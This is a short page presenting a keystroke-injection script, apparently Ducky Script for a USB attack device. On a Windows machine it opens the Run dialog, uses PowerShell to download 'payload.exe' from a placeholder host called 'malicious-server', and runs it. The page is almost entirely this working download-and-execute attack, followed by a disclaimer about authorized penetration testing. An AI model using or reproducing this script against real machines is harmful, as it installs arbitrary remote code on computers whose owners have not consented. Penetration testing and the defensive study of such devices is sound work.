# Download and Execute a Payload

This script downloads and executes a payload from a remote server.

```
DELAY 500
GUI r
DELAY 500
STRING powershell -Command "Invoke-WebRequest 'http://malicious-server/payload.exe' -OutFile 'C:\payload.exe'"
ENTER
DELAY 500
STRING C:\payload.exe
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.